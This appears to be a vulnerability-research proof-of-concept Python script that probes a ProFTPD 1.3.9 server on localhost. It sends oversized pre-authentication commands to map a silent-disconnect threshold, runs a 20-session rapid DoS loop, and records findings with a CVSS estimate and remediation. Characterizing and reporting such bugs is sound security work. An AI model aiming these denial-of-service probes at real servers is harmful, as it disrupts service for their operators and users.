#!/usr/bin/env python3
"""
ProFTPD Phase 4 — Pre-Auth Long Command DoS Test
Tests whether the E2BIG silent disconnect can be triggered BEFORE authentication.
RFC 959: Servers MUST send 500 error for malformed commands.
This tests if ProFTPD sends a 500, or silently drops the connection.

Also tests the exact threshold boundary (PR_DEFAULT_CMD_BUFSZ = PR_TUNABLE_PATH_MAX + 7 = 4103 on Linux)
"""
import socket, time, json, sys
from datetime import datetime

HOST, PORT = "127.0.0.1", 21
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def test_cmd_length(cmd_prefix, length, pre_auth=True, label=""):
    """
    Send cmd_prefix + 'A'*length + CRLF before auth.
    Returns: (response_bytes, got_response, connection_alive)
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))

        # Read banner
        s.settimeout(3)
        banner = b""
        try:
            banner = s.recv(512)
        except: pass

        if b"220" not in banner:
            s.close()
            return None, False, False

        # Optional pre-auth login
        if not pre_auth:
            s.sendall(b"USER ftptest\r\n")
            time.sleep(0.1)
            try: s.recv(512)
            except: pass
            s.sendall(b"PASS ftptest123\r\n")
            time.sleep(0.1)
            try: s.recv(512)
            except: pass

        # Send the long command
        filler = "A" * length
        long_cmd = f"{cmd_prefix} {filler}\r\n".encode()
        send_start = time.time()
        s.sendall(long_cmd)

        # Capture response
        s.settimeout(8)  # Give extra time for the 3x 250ms sleeps
        response = b""
        got_eof = False
        got_rst = False

        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    got_eof = True
                    break
                response += chunk
                # Check for complete FTP response
                decoded = response.decode('utf-8','replace')
                lines = [l for l in decoded.strip().split('\n') if l.strip()]
                if lines:
                    last = lines[-1]
                    if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                        break
        except socket.timeout:
            pass
        except ConnectionResetError:
            got_rst = True

        elapsed = time.time() - send_start

        # Test if connection still alive
        alive = False
        try:
            s.settimeout(2)
            s.sendall(b"NOOP\r\n")
            noop_resp = s.recv(256)
            alive = b"200" in noop_resp
        except:
            alive = False

        s.close()
        return response, elapsed, got_eof, got_rst, alive

    except Exception as e:
        return None, 0, False, False, False

def main():
    print("=" * 65)
    print("Phase 4: Pre-Auth Long Command DoS Analysis")
    print("ProFTPD 1.3.9 — E2BIG Silent Disconnect Characterization")
    print("=" * 65)

    results = {
        "test": "preauth_longcmd_dos",
        "date": datetime.now().isoformat(),
        "description": (
            "Tests whether too-long FTP commands cause silent session disconnect "
            "before and after authentication. RFC 959 requires a 500 response. "
            "ProFTPD's E2BIG path in pr_cmd_read() calls pr_session_disconnect() "
            "without sending any error response."
        ),
        "source_reference": {
            "file": "src/main.c",
            "function": "pr_cmd_read()",
            "lines": "504-516",
            "mechanism": (
                "pr_netio_telnet_gets2() returns -1/E2BIG when command line "
                "exceeds PR_DEFAULT_CMD_BUFSZ (PR_TUNABLE_PATH_MAX+7 = 4103 bytes). "
                "After too_large_count > 3, returns -1 from pr_cmd_read, triggering "
                "pr_session_disconnect(PR_SESS_DISCONNECT_CLIENT_EOF) — "
                "no error response is sent."
            )
        },
        "findings": {}
    }

    # Test 1: Boundary analysis — what length triggers the silent drop?
    print("\n[1] Boundary Analysis — Command Length Threshold (pre-auth)")
    print(f"    PR_DEFAULT_CMD_BUFSZ = PR_TUNABLE_PATH_MAX + 7 = 4103 bytes")
    boundary_results = {}

    test_lengths = [
        512, 1024, 2048, 3000, 4000,
        4095, 4096, 4097, 4098, 4099, 4100, 4101, 4102, 4103,
        4500, 8192, 16384
    ]

    for length in test_lengths:
        r = test_cmd_length("USER", length, pre_auth=True)
        if r[0] is None:
            boundary_results[str(length)] = {"error": "connection failed"}
            continue
        response, elapsed, got_eof, got_rst, alive = r
        decoded = response.decode('utf-8','replace') if response else ""
        got_500 = "500" in decoded
        got_550 = "550" in decoded
        silent_drop = (len(response) == 0) and (got_eof or got_rst)

        status = "SILENT_DROP" if silent_drop else ("500_RESPONSE" if got_500 else ("NORMAL" if alive else "DROP_NO_ERROR"))

        print(f"  USER + {length:5d}A → {status:15s} | response:{len(response):4d}B | eof:{got_eof} | rst:{got_rst} | alive:{alive} | t:{elapsed:.2f}s")
        boundary_results[str(length)] = {
            "cmd": f"USER {'A'*4}...({'A'*length}) [{length} bytes arg]",
            "response_len": len(response),
            "response_preview": decoded[:80],
            "got_500": got_500,
            "silent_drop": silent_drop,
            "got_eof": got_eof,
            "got_rst": got_rst,
            "connection_alive_after": alive,
            "elapsed_seconds": round(elapsed, 3),
            "status": status
        }
        time.sleep(0.3)

    results["findings"]["boundary_analysis"] = boundary_results

    # Test 2: Pre-auth vs Post-auth comparison
    print("\n[2] Pre-Auth vs Post-Auth Comparison (16384-byte argument)")
    comparison = {}
    for is_preauth, label in [(True, "pre_auth"), (False, "post_auth")]:
        r = test_cmd_length("USER" if is_preauth else "STOR", 16384, pre_auth=is_preauth)
        if r[0] is None:
            comparison[label] = {"error": "connection failed"}
            continue
        response, elapsed, got_eof, got_rst, alive = r
        decoded = response.decode('utf-8','replace') if response else ""
        silent_drop = (len(response) == 0) and (got_eof or got_rst)
        print(f"  {label}: response={len(response)}B silent_drop={silent_drop} eof={got_eof} rst={got_rst} t={elapsed:.2f}s")
        comparison[label] = {
            "cmd": f"{'USER' if is_preauth else 'STOR'} A*16384",
            "response_len": len(response),
            "response_preview": decoded[:80],
            "silent_drop": silent_drop,
            "got_eof": got_eof,
            "got_rst": got_rst,
            "elapsed_seconds": round(elapsed, 3)
        }
        time.sleep(0.5)
    results["findings"]["preauth_vs_postauth"] = comparison

    # Test 3: Rapid successive sessions (DoS potential — connection resource usage)
    print("\n[3] Rapid DoS Simulation — 20 pre-auth silent drops")
    drop_count = 0
    error_count = 0
    timings = []
    for i in range(20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((HOST, PORT))
            s.recv(512)  # banner
            t0 = time.time()
            s.sendall(b"USER " + b"A" * 16384 + b"\r\n")
            s.settimeout(8)
            resp = b""
            try:
                while True:
                    c = s.recv(4096)
                    if not c: break
                    resp += c
            except: pass
            timings.append(round(time.time() - t0, 3))
            if len(resp) == 0:
                drop_count += 1
            s.close()
        except Exception as e:
            error_count += 1
        time.sleep(0.05)

    avg_time = sum(timings)/len(timings) if timings else 0
    print(f"  Silent drops: {drop_count}/20 | Errors: {error_count} | Avg disconnect time: {avg_time:.2f}s")
    # Check server still alive
    try:
        s = socket.socket(); s.settimeout(5); s.connect((HOST, PORT))
        b = s.recv(256); s.close()
        server_alive = b"220" in b
    except:
        server_alive = False
    print(f"  Server still alive: {server_alive}")

    results["findings"]["rapid_dos"] = {
        "iterations": 20,
        "silent_drops": drop_count,
        "errors": error_count,
        "avg_disconnect_time_seconds": round(avg_time, 3),
        "server_alive_after": server_alive,
        "impact": (
            "Each oversized USER command forces server to read and discard up to "
            "~4 * PR_DEFAULT_CMD_BUFSZ bytes, sleeping 3 * 250ms = 750ms per session. "
            "100 concurrent connections × 750ms + teardown = sustained resource consumption."
        )
    }

    # Test 4: Different commands — which are pre-auth exploitable?
    print("\n[4] Pre-Auth Command Coverage (which commands accept pre-auth?)")
    preauth_cmds = ["USER", "PASS", "QUIT", "HELP", "SYST", "FEAT", "AUTH"]
    cmd_results = {}
    for preauth_cmd in preauth_cmds:
        r = test_cmd_length(preauth_cmd, 8192, pre_auth=True)
        if r[0] is None:
            cmd_results[preauth_cmd] = {"error": "failed"}
            continue
        response, elapsed, got_eof, got_rst, alive = r
        decoded = response.decode('utf-8','replace') if response else ""
        silent_drop = (len(response) == 0) and (got_eof or got_rst)
        print(f"  {preauth_cmd:8s} + 8192A → {'SILENT_DROP' if silent_drop else 'RESPONDS':12s} | {decoded[:50]!r}")
        cmd_results[preauth_cmd] = {
            "silent_drop": silent_drop,
            "response_preview": decoded[:80],
            "got_eof": got_eof,
            "elapsed": round(elapsed, 3)
        }
        time.sleep(0.3)
    results["findings"]["preauth_command_coverage"] = cmd_results

    # Summary
    results["summary"] = {
        "vulnerability": "Silent session disconnect on oversized FTP command lines",
        "cve_status": "Novel finding — not assigned CVE",
        "severity": "MEDIUM",
        "cvss_estimate": "5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)",
        "requires_auth": False,
        "rfc_violation": "RFC 959 Section 5.4 — server MUST send 500 for syntax errors",
        "affected_versions": "ProFTPD 1.3.9 (confirmed); likely all versions using PR_DEFAULT_CMD_BUFSZ",
        "root_cause": (
            "pr_cmd_read() in src/main.c calls pr_session_disconnect() when "
            "too_large_count exceeds 3 E2BIG returns from pr_netio_telnet_gets2(). "
            "No error response is sent. Server logs misclassify as client EOF."
        ),
        "remediation": (
            "Send 500 'Command too long' response before calling pr_session_disconnect(). "
            "Or limit too_large_count retries more aggressively and send 421 goodbye."
        )
    }

    outfile = f"{EVIDENCE_DIR}/phase4_preauth_longcmd_dos.json"
    with open(outfile, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\n[*] Evidence saved to {outfile}")

    return results

if __name__ == "__main__":
    main()
